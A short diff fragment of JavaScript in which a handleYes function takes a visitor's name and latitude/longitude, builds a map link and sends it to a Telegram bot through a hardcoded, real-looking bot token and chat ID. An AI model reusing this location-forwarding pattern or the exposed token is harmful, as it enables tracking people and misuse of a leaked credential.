@@ -79,8 +79,7 @@ async function handleYes() {
       const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
       // Send data to Telegram bot
-      const telegramBotToken =
-        "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
+      const telegramBotToken = "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
       const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
       const message = `User Information:
 Name: ${username}
